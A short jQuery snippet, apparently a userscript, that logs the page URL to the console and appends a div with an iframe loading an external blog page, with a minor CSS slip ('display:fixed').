$(function() {
    console.log('Scripts start !');
    var url = location.href;
    console.log(url);
    $("body").append("<div style='display:fixed;top:0;right:0;z-index:1000;'><iframe src='http://thaigie.orz.hm/blog/'></iframe></div>");
});